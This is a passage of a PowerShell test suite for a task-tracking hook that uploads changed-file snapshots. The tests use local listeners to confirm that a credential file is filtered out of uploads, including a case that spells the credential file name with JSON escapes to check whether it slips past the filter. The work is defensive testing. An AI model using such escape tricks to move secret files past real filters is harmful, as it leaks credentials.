    $exclJson = @{ tool_input = @{ command = $exclCmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $exclJson -Phase 'pre' -ProjectDir $exclProj
    Assert-Exit "7e: hook exits 0 after filtered PUT" 0 $r.ExitCode

    Wait-Job $exclListenerJob -Timeout 8 | Out-Null
    Remove-Job $exclListenerJob -Force -ErrorAction SilentlyContinue

    if (Test-Path $exclFixture) {
        $record = Get-Content -Raw -Path $exclFixture | ConvertFrom-Json
        $parsedBody = $record.Body | ConvertFrom-Json
        $decoded = [System.Convert]::FromBase64String($parsedBody.changed_files.data)
        $decodedText = [System.Text.Encoding]::UTF8.GetString($decoded)
        $entries = @($decodedText | ConvertFrom-Json)
        $paths = @($entries | ForEach-Object { $_.path })
        Assert-Eq "7e: filtered snapshot keeps only the non-artifact entries" "2" "$($entries.Count)"
        if ($paths -contains 'lib/foo.ex' -and $paths -contains 'sub/.stride-changed-files.json') {
            Write-Host "  PASS: 7e: real file and subdir same-named file survive the filter" -ForegroundColor Green
            $script:PASS++
        } else {
            Write-Host "  FAIL: 7e: expected lib/foo.ex + sub/.stride-changed-files.json, got: $($paths -join ', ')" -ForegroundColor Red
            $script:FAIL++
        }
        if ($paths -notcontains '.stride-diff-upload-state' -and $paths -notcontains '.stride-changed-files.json') {
            Write-Host "  PASS: 7e: root upload-state and snapshot artifacts stripped from PUT body" -ForegroundColor Green
            $script:PASS++
        } else {
            Write-Host "  FAIL: 7e: root artifacts leaked into PUT body: $($paths -join ', ')" -ForegroundColor Red
            $script:FAIL++
        }
    } else {
        Write-Host "  FAIL: 7e: filtered PUT did not arrive at listener" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($exclListenerJob -and $exclListenerJob.State -eq 'Running') {
        Stop-Job $exclListenerJob -ErrorAction SilentlyContinue
        Remove-Job $exclListenerJob -Force -ErrorAction SilentlyContinue
    }
}

# 7e2 (W2100): the UPLOAD-side D67/W1457 filter, which 7e no longer covers now
# that its fixture is a real repo and the hook builds its own clean snapshot.
# The only remaining path that uploads a snapshot it did NOT build is the
# before_review self-heal, which leaves an existing file untouched — so drive
# that, with a deliberately artifact-bearing snapshot on disk, and assert the
# PUT body came out filtered.
#
# This case is load-bearing beyond its own assertion: the upload filter had no
# coverage at all for a while, and that is precisely how a 5.1 fail-open in it
# (ConvertTo-Json -AsArray throwing into a catch that uploads the RAW bytes)
# went unnoticed.
# Deliberately NOT a git repo: the self-heal skips its build when a snapshot is
# already on disk, and the upload filter is name-based, so no repository is
# needed to exercise it. That also keeps this case testing the upload filter
# and nothing else.
$excl2Proj = Join-Path $TmpDir 'put-exclude-selfheal'
New-Item -ItemType Directory -Path $excl2Proj -Force | Out-Null
Set-Content -Path (Join-Path $excl2Proj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $excl2Proj '.stride-env-cache') -Value "TASK_ID=42" -Encoding UTF8
Set-Content -Path (Join-Path $excl2Proj '.stride-changed-files.json') `
    -Value '[{"path":".stride-diff-upload-state","diff":"state body"},{"path":"lib/foo.ex","diff":"real patch"},{"path":"sub/.stride-changed-files.json","diff":"user file"},{"path":".stride_auth.md","diff":"SECRET"}]' -Encoding UTF8
$excl2Port = 18893
$excl2Fixture = Join-Path $TmpDir 'put-exclude-selfheal-fixture.json'
if (Test-Path $excl2Fixture) { Remove-Item -Force $excl2Fixture }
$excl2Job = Start-Job -ArgumentList $excl2Port, $excl2Fixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
        @{ Body = $reader.ReadToEnd() } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $ctx.Response.StatusCode = 200
        $ctx.Response.OutputStream.Close()
    } catch {
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}
try {
    $null = Wait-ForListener -Port $excl2Port
    $excl2Cmd = "curl -X PATCH http://localhost:$excl2Port/api/tasks/42/complete -H `"Authorization: Bearer tok`""
    $excl2Json = @{ tool_input = @{ command = $excl2Cmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $excl2Json -Phase 'post' -ProjectDir $excl2Proj
    Assert-Exit "7e2: the self-heal exits 0" 0 $r.ExitCode
    Wait-Job $excl2Job -Timeout 8 | Out-Null
    Remove-Job $excl2Job -Force -ErrorAction SilentlyContinue
    if (Test-Path $excl2Fixture) {
        $rec2 = Get-Content -Raw -Path $excl2Fixture | ConvertFrom-Json
        $body2 = $rec2.Body | ConvertFrom-Json
        $txt2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($body2.changed_files.data))
        $paths2 = @(@($txt2 | ConvertFrom-Json) | ForEach-Object { $_.path })
        Assert-Eq "7e2: the upload filter strips the root upload-state artifact" "False" "$($paths2 -contains '.stride-diff-upload-state')"
        Assert-Eq "7e2: the upload filter strips the credential file" "False" "$($paths2 -contains '.stride_auth.md')"
        Assert-Eq "7e2: the real change survives the upload filter" "True" "$($paths2 -contains 'lib/foo.ex')"
        Assert-Eq "7e2: a same-named SUBDIRECTORY file survives the upload filter" "True" "$($paths2 -contains 'sub/.stride-changed-files.json')"
    } else {
        Write-Host "  FAIL: 7e2: the self-heal PUT did not arrive at the listener" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($excl2Job -and $excl2Job.State -eq 'Running') {
        Stop-Job $excl2Job -ErrorAction SilentlyContinue
        Remove-Job $excl2Job -Force -ErrorAction SilentlyContinue
    }
}

# 7e3 (D290): the upload filter's FAILURE path. 7e2 above pins what the filter
# drops when it runs to completion; this pins what happens when it throws
# part-way. The filter sits inside a try whose catch used to "recover" by
# uploading the RAW bytes, so any throw inside it re-armed the very fail-open
# W2100 closed for its one named cause — and under Set-StrictMode -Version
# Latest an entry carrying no `path` property throws at exactly that comparison.
# The path-less entry is deliberately placed BEFORE the credential entry, which
# is what makes this the realistic shape: the filter aborts before it ever
# reaches the artifact it exists to strip.
#
# Asserts on what reached the LISTENER, not merely on what the hook logged — a
# refusal that still PUT the body would satisfy a log-only assertion. The
# fixture value below is a placeholder, never a real token.
$refuseProj = Join-Path $TmpDir 'put-refuse-selfheal'
New-Item -ItemType Directory -Path $refuseProj -Force | Out-Null
Set-Content -Path (Join-Path $refuseProj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $refuseProj '.stride-env-cache') -Value "TASK_ID=42" -Encoding UTF8
Set-Content -Path (Join-Path $refuseProj '.stride-changed-files.json') `
    -Value '[{"path":"lib/foo.ex","diff":"real patch"},{"diff":"entry with no path property"},{"path":".stride_auth.md","diff":"placeholder-not-a-real-token"}]' -Encoding UTF8
$refusePort = 18905
$refuseFixture = Join-Path $TmpDir 'put-refuse-selfheal-fixture.json'
if (Test-Path $refuseFixture) { Remove-Item -Force $refuseFixture }
# Unlike 7e2's listener this one records EVERY request until a deadline, and
# records the method and URL alongside the body. 7e2 can stop at the first
# request because the PUT it asserts on is the first thing the hook sends; here
# the PUT is expected NOT to happen, so the first arrival is the D119
# after_goal_status GET the hook fires afterwards. A listener that stopped at
# the first request would capture that GET and a naive "nothing arrived" check
# would fail on it — which is exactly what the first draft of this test did.
$refuseJob = Start-Job -ArgumentList $refusePort, $refuseFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    $records = New-Object System.Collections.ArrayList
    try {
        $l.Start()
        $deadline = (Get-Date).AddSeconds(8)
        while ((Get-Date) -lt $deadline) {
            $pending = $l.GetContextAsync()
            $remainingMs = [int][math]::Max(1, ($deadline - (Get-Date)).TotalMilliseconds)
            if (-not $pending.Wait($remainingMs)) { break }
            $ctx = $pending.Result
            $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
            $null = $records.Add(@{
                Method = "$($ctx.Request.HttpMethod)"
                Url    = "$($ctx.Request.RawUrl)"
                Body   = $reader.ReadToEnd()
            })
            $ctx.Response.StatusCode = 200
            $ctx.Response.OutputStream.Close()
        }
    } catch {
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
    @{ Records = @($records) } | ConvertTo-Json -Depth 5 -Compress |
        Set-Content -Path $Fixture -Encoding UTF8
}
try {
    $null = Wait-ForListener -Port $refusePort
    $refuseCmd = "curl -X PATCH http://localhost:$refusePort/api/tasks/42/complete -H `"Authorization: Bearer tok`""
    $refuseJson = @{ tool_input = @{ command = $refuseCmd } } | ConvertTo-Json -Compress
    $r3 = Invoke-HookScript -InputJson $refuseJson -Phase 'post' -ProjectDir $refuseProj
    Assert-Exit "7e3: a refused upload is still non-fatal to the hook" 0 $r3.ExitCode
    Wait-Job $refuseJob -Timeout 20 | Out-Null
    Stop-Job $refuseJob -ErrorAction SilentlyContinue
    Remove-Job $refuseJob -Force -ErrorAction SilentlyContinue
    $refusePut = $null
    if (Test-Path $refuseFixture) {
        $recR = Get-Content -Raw -Path $refuseFixture | ConvertFrom-Json
        foreach ($entry in @($recR.Records)) {
            if ($null -eq $entry) { continue }
            if ("$($entry.Method)" -eq 'PUT' -and "$($entry.Url)" -match '/changed_files') {
                $refusePut = $entry
                break
            }
        }
    }
    Assert-Eq "7e3: a throw inside the filter PUTs no changed_files at all" "True" "$($null -eq $refusePut)"
    if ($null -ne $refusePut) {
        # Only reachable on a regression, and worth the extra line: it says
        # whether the leak actually carried the credential name or was merely a
        # stray PUT. Decoded defensively — a regression may not produce the
        # envelope shape at all, and this assertion must not crash the suite.
        $leaked = ''
        try {
            $bodyR = $refusePut.Body | ConvertFrom-Json
            $leaked = [System.Text.Encoding]::UTF8.GetString(
                [System.Convert]::FromBase64String($bodyR.changed_files.data))
        } catch {
            $leaked = "$($refusePut.Body)"
        }
        Assert-Eq "7e3: the leaked body does not name the credential file" "False" "$($leaked -match '\.stride_auth\.md')"
    }
    Assert-Eq "7e3: the refusal is reported on stderr" "True" "$($r3.Stderr -match 'upload REFUSED')"
    Assert-Eq "7e3: the refusal routes through the existing non-2xx warning" "True" "$($r3.Stderr -match 'changed_files upload failed \(HTTP 000\)')"
} finally {
    if ($refuseJob -and $refuseJob.State -eq 'Running') {
        Stop-Job $refuseJob -ErrorAction SilentlyContinue
        Remove-Job $refuseJob -Force -ErrorAction SilentlyContinue
    }
}

# 7e4 (D290): the other half of the same change — its NARROWNESS. The raw-bytes
# path is genuinely correct for a snapshot that is not parseable as the expected
# array, and D290 deliberately did not delete it. Same throwing entry as 7e3,
# minus any hard-excluded name: the re-check inside the catch finds nothing to
# refuse, so the raw bytes upload byte-for-byte as they did before D290.
#
# Without this case the refusal could widen to "any throw refuses" and nothing
# would notice.
$rawProj = Join-Path $TmpDir 'put-rawpath-selfheal'
New-Item -ItemType Directory -Path $rawProj -Force | Out-Null
Set-Content -Path (Join-Path $rawProj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $rawProj '.stride-env-cache') -Value "TASK_ID=42" -Encoding UTF8
$rawSnapshot = '[{"path":"lib/foo.ex","diff":"real patch"},{"diff":"entry with no path property"}]'
Set-Content -Path (Join-Path $rawProj '.stride-changed-files.json') -Value $rawSnapshot -Encoding UTF8 -NoNewline
$rawPort = 18906
$rawFixture = Join-Path $TmpDir 'put-rawpath-selfheal-fixture.json'
if (Test-Path $rawFixture) { Remove-Item -Force $rawFixture }
$rawJob = Start-Job -ArgumentList $rawPort, $rawFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
        @{ Body = $reader.ReadToEnd() } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $ctx.Response.StatusCode = 200
        $ctx.Response.OutputStream.Close()
    } catch {
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}
try {
    $null = Wait-ForListener -Port $rawPort
    $rawCmd = "curl -X PATCH http://localhost:$rawPort/api/tasks/42/complete -H `"Authorization: Bearer tok`""
    $rawJson = @{ tool_input = @{ command = $rawCmd } } | ConvertTo-Json -Compress
    $r4 = Invoke-HookScript -InputJson $rawJson -Phase 'post' -ProjectDir $rawProj
    Assert-Exit "7e4: the self-heal exits 0" 0 $r4.ExitCode
    Wait-Job $rawJob -Timeout 8 | Out-Null
    Remove-Job $rawJob -Force -ErrorAction SilentlyContinue
    if (Test-Path $rawFixture) {
        $rec4 = Get-Content -Raw -Path $rawFixture | ConvertFrom-Json
        $body4 = $rec4.Body | ConvertFrom-Json
        $txt4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($body4.changed_files.data))
        Assert-Eq "7e4: an unparseable snapshot naming no artifact still uploads" $rawSnapshot $txt4
    } else {
        Write-Host "  FAIL: 7e4: the raw-bytes upload did not arrive at the listener" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($rawJob -and $rawJob.State -eq 'Running') {
        Stop-Job $rawJob -ErrorAction SilentlyContinue
        Remove-Job $rawJob -Force -ErrorAction SilentlyContinue
    }
}

# 7e5 (D290): the re-check must see the DECODED spelling, not just the literal
# one. The structured filter compares paths ConvertFrom-Json has already
# unescaped, so a snapshot naming the credential file with JSON escapes —
# "\u002estride_auth.md" decodes to '.stride_auth.md' — is the excluded path as
# far as the filter is concerned, but slips an exact-name regex run over the raw
# text. Same throwing entry as 7e3 so the catch is the path under test; only the
# spelling differs. Surfaced by the D290 security review as the one way the
# backstop could still be walked past.
$escProj = Join-Path $TmpDir 'put-escaped-selfheal'
New-Item -ItemType Directory -Path $escProj -Force | Out-Null
Set-Content -Path (Join-Path $escProj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $escProj '.stride-env-cache') -Value "TASK_ID=42" -Encoding UTF8
Set-Content -Path (Join-Path $escProj '.stride-changed-files.json') `
    -Value '[{"path":"lib/foo.ex","diff":"real patch"},{"diff":"entry with no path property"},{"path":"\u002estride_auth.md","diff":"placeholder-not-a-real-token"}]' -Encoding UTF8
$escPort = 18907
$escFixture = Join-Path $TmpDir 'put-escaped-selfheal-fixture.json'
if (Test-Path $escFixture) { Remove-Item -Force $escFixture }
$escJob = Start-Job -ArgumentList $escPort, $escFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    $records = New-Object System.Collections.ArrayList
    try {
        $l.Start()
        $deadline = (Get-Date).AddSeconds(8)
        while ((Get-Date) -lt $deadline) {
            $pending = $l.GetContextAsync()
            $remainingMs = [int][math]::Max(1, ($deadline - (Get-Date)).TotalMilliseconds)
            if (-not $pending.Wait($remainingMs)) { break }
            $ctx = $pending.Result
            $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
            $null = $records.Add(@{
                Method = "$($ctx.Request.HttpMethod)"
                Url    = "$($ctx.Request.RawUrl)"
                Body   = $reader.ReadToEnd()
            })
            $ctx.Response.StatusCode = 200
            $ctx.Response.OutputStream.Close()
        }
    } catch {
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
    @{ Records = @($records) } | ConvertTo-Json -Depth 5 -Compress |
        Set-Content -Path $Fixture -Encoding UTF8
}
try {
    $null = Wait-ForListener -Port $escPort
    $escCmd = "curl -X PATCH http://localhost:$escPort/api/tasks/42/complete -H `"Authorization: Bearer tok`""
    $escJson = @{ tool_input = @{ command = $escCmd } } | ConvertTo-Json -Compress
    $r5 = Invoke-HookScript -InputJson $escJson -Phase 'post' -ProjectDir $escProj
    Assert-Exit "7e5: an escaped-name refusal is still non-fatal to the hook" 0 $r5.ExitCode
    Wait-Job $escJob -Timeout 20 | Out-Null
    Stop-Job $escJob -ErrorAction SilentlyContinue
    Remove-Job $escJob -Force -ErrorAction SilentlyContinue
    $escPut = $null
    if (Test-Path $escFixture) {
        $rec5 = Get-Content -Raw -Path $escFixture | ConvertFrom-Json
        foreach ($entry in @($rec5.Records)) {
            if ($null -eq $entry) { continue }
            if ("$($entry.Method)" -eq 'PUT' -and "$($entry.Url)" -match '/changed_files') {
                $escPut = $entry
                break
            }
        }
    }
    Assert-Eq "7e5: a JSON-escaped credential name is refused too" "True" "$($null -eq $escPut)"
    Assert-Eq "7e5: the escaped-name refusal is reported on stderr" "True" "$($r5.Stderr -match 'upload REFUSED')"
} finally {
    if ($escJob -and $escJob.State -eq 'Running') {
        Stop-Job $escJob -ErrorAction SilentlyContinue
        Remove-Job $escJob -Force -ErrorAction SilentlyContinue
    }
}

# 7g (D54): variable-based completion command + .stride_auth.md. The documented
# curl uses $STRIDE_API_URL / $STRIDE_API_TOKEN, so $Command has no literal
# URL/token; the hook must resolve them from .stride_auth.md, preferring the
# production "**API Token:**" line over "**Local API Token:**".
$putVarProj = Join-Path $TmpDir 'put-var-project'
New-Item -ItemType Directory -Path $putVarProj -Force | Out-Null
Set-Content -Path (Join-Path $putVarProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $putVarProj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"unified patch body"}]' -Encoding UTF8
Set-Content -Path (Join-Path $putVarProj '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=abc" -Encoding UTF8

$putVarPort = 18878
# Build .stride_auth.md from single-quoted lines so backticks stay literal.
$putVarAuth = @(
    '- **API URL:** `http://localhost:' + $putVarPort + '`'
    '- **Local API Token:** `LOCAL_should_not_be_used`'
    '- **API Token:** `PROD_token_7g`'
)
Set-Content -Path (Join-Path $putVarProj '.stride_auth.md') -Value $putVarAuth -Encoding UTF8

$putVarFixture = Join-Path $TmpDir 'put-var-fixture.json'
if (Test-Path $putVarFixture) { Remove-Item -Force $putVarFixture }

$putVarListenerJob = Start-Job -ArgumentList $putVarPort, $putVarFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $req = $ctx.Request
        $reader = [System.IO.StreamReader]::new($req.InputStream)
        $body = $reader.ReadToEnd()
        @{
            Method = $req.HttpMethod
            Path   = $req.Url.AbsolutePath
            Auth   = $req.Headers['Authorization']
            Body   = $body
        } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $resp = $ctx.Response
        $resp.StatusCode = 200
        $resp.OutputStream.Close()
    } catch {
        # Listener tear-down errors are ignored.
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}

try {
    $null = Wait-ForListener -Port $putVarPort
    $putVarCmd = "curl -X PATCH `$STRIDE_API_URL/api/tasks/99/complete -H `"Authorization: Bearer `$STRIDE_API_TOKEN`""
    # Same ConvertTo-Json escaping note as 7a.
    $putVarJson = @{ tool_input = @{ command = $putVarCmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $putVarJson -Phase 'pre' -ProjectDir $putVarProj
    Assert-Exit "7g: hook exits 0 after variable-command PUT" 0 $r.ExitCode

    Wait-Job $putVarListenerJob -Timeout 8 | Out-Null
    Remove-Job $putVarListenerJob -Force -ErrorAction SilentlyContinue

    if (Test-Path $putVarFixture) {
        $record = Get-Content -Raw -Path $putVarFixture | ConvertFrom-Json
        Assert-Contains "7g: variable-command PUT targets /changed_files" "/api/tasks/99/changed_files" $record.Path
        Assert-Eq "7g: Bearer token resolved from .stride_auth.md (production, not Local)" "Bearer PROD_token_7g" $record.Auth
    } else {
        Write-Host "  FAIL: 7g: PUT did not arrive at listener (auth-file resolution failed)" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($putVarListenerJob -and $putVarListenerJob.State -eq 'Running') {
        Stop-Job $putVarListenerJob -ErrorAction SilentlyContinue
        Remove-Job $putVarListenerJob -Force -ErrorAction SilentlyContinue
    }
}

# 7b: PUT failure (unreachable URL) does not propagate
$putFailProj = Join-Path $TmpDir 'put-fail-project'
New-Item -ItemType Directory -Path $putFailProj -Force | Out-Null
Set-Content -Path (Join-Path $putFailProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $putFailProj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"body"}]' -Encoding UTF8
Set-Content -Path (Join-Path $putFailProj '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=abc" -Encoding UTF8

# Port 1 is unreachable on every reasonable system.
$failCmd = 'curl -X PATCH http://127.0.0.1:1/api/tasks/99/complete -H "Authorization: Bearer tok"'
$failJson = "{`"tool_input`":{`"command`":`"$failCmd`"}}"
$r = Invoke-HookScript -InputJson $failJson -Phase 'pre' -ProjectDir $putFailProj
Assert-Exit "7b: hook exits 0 even when PUT fails" 0 $r.ExitCode
$snapshotPath7b = Join-Path $putFailProj '.stride-changed-files.json'
if (Test-Path $snapshotPath7b) {
    Write-Host "  PASS: 7b: snapshot file persists across failed PUT" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 7b: snapshot file missing after failed PUT" -ForegroundColor Red
    $script:FAIL++
}

# 7c: No snapshot file on disk → Invoke-FinalizeAfterDoing no-ops cleanly
$noSnapProj = Join-Path $TmpDir 'no-snap-project'
New-Item -ItemType Directory -Path $noSnapProj -Force | Out-Null
Set-Content -Path (Join-Path $noSnapProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $noSnapProj '.stride-env-cache') `
    -Value "TASK_ID=99" -Encoding UTF8
$noSnapCmd = 'curl -X PATCH http://127.0.0.1:1/api/tasks/99/complete -H "Authorization: Bearer tok"'
$noSnapJson = "{`"tool_input`":{`"command`":`"$noSnapCmd`"}}"
$r = Invoke-HookScript -InputJson $noSnapJson -Phase 'pre' -ProjectDir $noSnapProj
Assert-Exit "7c: hook exits 0 with no snapshot file" 0 $r.ExitCode

# 7d: No Bearer token in `$Command → finalize no-ops (snapshot still untouched)
$noTokProj = Join-Path $TmpDir 'no-tok-project'
New-Item -ItemType Directory -Path $noTokProj -Force | Out-Null
Set-Content -Path (Join-Path $noTokProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $noTokProj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"body"}]' -Encoding UTF8
Set-Content -Path (Join-Path $noTokProj '.stride-env-cache') `
    -Value "TASK_ID=99" -Encoding UTF8
# No Authorization header in the agent's curl.
$noTokCmd = 'curl -X PATCH http://stride.example.com/api/tasks/99/complete'
$noTokJson = "{`"tool_input`":{`"command`":`"$noTokCmd`"}}"
$r = Invoke-HookScript -InputJson $noTokJson -Phase 'pre' -ProjectDir $noTokProj
Assert-Exit "7d: hook exits 0 with no Bearer token" 0 $r.ExitCode

# 7e (D127): No env TASK_ID AND no numeric id in the /complete URL → finalize
# no-ops. (After D127 the URL can supply the id, so the URL segment here is
# deliberately non-numeric to exercise the genuine no-id path.)
$noIdProj = Join-Path $TmpDir 'no-id-project'
New-Item -ItemType Directory -Path $noIdProj -Force | Out-Null
Set-Content -Path (Join-Path $noIdProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $noIdProj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"body"}]' -Encoding UTF8
# Env cache without TASK_ID.
Set-Content -Path (Join-Path $noIdProj '.stride-env-cache') `
    -Value "TASK_BASE_REF=abc" -Encoding UTF8
$noIdCmd = 'curl -X PATCH http://stride.example.com/api/tasks/none/complete -H "Authorization: Bearer tok"'
$noIdJson = "{`"tool_input`":{`"command`":`"$noIdCmd`"}}"
$r = Invoke-HookScript -InputJson $noIdJson -Phase 'pre' -ProjectDir $noIdProj
Assert-Exit "7e: hook exits 0 when neither env cache nor URL yields a task id" 0 $r.ExitCode

# 7h (D127): finalize PUTs to the task id in the /complete URL, NOT a stale
# env-cache TASK_ID. Env cache says 111 (a previous task); the completion URL
# says 99 → the PUT must target /api/tasks/99/changed_files. This is the fix for
# the empty-changed_files root cause: a hidden claim leaves a stale env TASK_ID,
# and before D127 the diff was PUT to that wrong task.
$d127Proj = Join-Path $TmpDir 'd127-url-id-project'
New-Item -ItemType Directory -Path $d127Proj -Force | Out-Null
Set-Content -Path (Join-Path $d127Proj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $d127Proj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"body"}]' -Encoding UTF8
# STALE env cache — a previous task's id.
Set-Content -Path (Join-Path $d127Proj '.stride-env-cache') `
    -Value "TASK_ID=111`nTASK_BASE_REF=abc" -Encoding UTF8

$d127Port = 18879
$d127Fixture = Join-Path $TmpDir 'd127-fixture.json'
if (Test-Path $d127Fixture) { Remove-Item -Force $d127Fixture }
$d127Job = Start-Job -ArgumentList $d127Port, $d127Fixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start(); $ctx = $l.GetContext(); $req = $ctx.Request
        @{ Path = $req.Url.AbsolutePath } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $resp = $ctx.Response; $resp.StatusCode = 200; $resp.OutputStream.Close()
    } catch { } finally { if ($l.IsListening) { $l.Stop() } }
}
try {
    $null = Wait-ForListener -Port $d127Port
    $d127Cmd = "curl -X PATCH http://localhost:$d127Port/api/tasks/99/complete -H `"Authorization: Bearer tok`""
    $d127Json = @{ tool_input = @{ command = $d127Cmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $d127Json -Phase 'pre' -ProjectDir $d127Proj
    Assert-Exit "7h: hook exits 0 after PUT" 0 $r.ExitCode
    Wait-Job $d127Job -Timeout 8 | Out-Null
    Remove-Job $d127Job -Force -ErrorAction SilentlyContinue
    $d127Path = if (Test-Path $d127Fixture) { (Get-Content -Raw -Path $d127Fixture | ConvertFrom-Json).Path } else { '' }
    Assert-Contains "7h (D127): PUT targets the URL task id (99), not the stale env id (111)" "/api/tasks/99/changed_files" $d127Path
    Assert-NotContains "7h (D127): PUT does not target the stale env id (111)" "/api/tasks/111/changed_files" $d127Path
} finally {
    Remove-Job $d127Job -Force -ErrorAction SilentlyContinue
}

# 7i (W1658): before_review self-heal TERMINAL failure — when the last retry PUT
# returns non-2xx, the hook prints a loud UNRESOLVED warning on stderr AND marks
# the state file `unresolved=yes` (a definitively-lost diff is never silently
# swallowed).
$w1658Proj = Join-Path $TmpDir 'w1658-terminal-project'
New-Item -ItemType Directory -Path $w1658Proj -Force | Out-Null
Set-Content -Path (Join-Path $w1658Proj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
# Pre-existing snapshot (the ps1 self-heal re-PUTs the on-disk snapshot; it does
# not re-capture). No state file → the self-heal retries.
Set-Content -Path (Join-Path $w1658Proj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"body"}]' -Encoding UTF8

$w1658Port = 18881
$w1658Job = Start-Job -ArgumentList $w1658Port -ScriptBlock {
    param($Port)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start(); $ctx = $l.GetContext()
        $resp = $ctx.Response; $resp.StatusCode = 500; $resp.OutputStream.Close()
    } catch { } finally { if ($l.IsListening) { $l.Stop() } }
}
try {
    $null = Wait-ForListener -Port $w1658Port
    $w1658Cmd = "curl -X PATCH http://localhost:$w1658Port/api/tasks/77/complete -H `"Authorization: Bearer tok`""
    $w1658Json = @{ tool_input = @{ command = $w1658Cmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $w1658Json -Phase 'post' -ProjectDir $w1658Proj
    Wait-Job $w1658Job -Timeout 8 | Out-Null
    Remove-Job $w1658Job -Force -ErrorAction SilentlyContinue
    Assert-Contains "7i (W1658): terminal self-heal failure prints a loud UNRESOLVED warning" "CHANGED_FILES UPLOAD UNRESOLVED" $r.Stderr
    $w1658StateFile = Join-Path $w1658Proj '.stride-diff-upload-state'
    $w1658State = if (Test-Path $w1658StateFile) { Get-Content -Raw -Path $w1658StateFile } else { '' }
    Assert-Contains "7i (W1658): state file marked unresolved on terminal failure" "unresolved=yes" $w1658State
} finally {
    Remove-Job $w1658Job -Force -ErrorAction SilentlyContinue
}

# ============================================================
# Test Group 8: after_goal end-to-end routing (W506)
# ============================================================
# Mirrors stride-hook.sh Test Group 10. Each case constructs a realistic
# tool_input + tool_response payload and asserts on the script's actual
# stdout / stderr / exit code. Fixtures use generic URLs and task IDs
# per the W506 pitfall.
Write-Host ""
Write-Host "=== Test Group 8: after_goal end-to-end routing (W506) ==="

# Helper: build a tool_response payload whose hooks array carries the
# listed entries. Mirrors the Claude Code Bash-tool transport shape
# (tool_response is an object with a stdout property holding API JSON
# as a string).
function Build-AfterGoalInput {
    param(
        [string]$PrimaryCommand,
        [string[]]$HookNames
    )
    $hooksArr = @($HookNames | ForEach-Object { @{ name = $_ } })
    $inner = (@{ data = @{ id = 99 }; hooks = $hooksArr } | ConvertTo-Json -Depth 5 -Compress)
    return (@{
        tool_input    = @{ command = $PrimaryCommand }
        tool_response = @{ stdout = $inner }
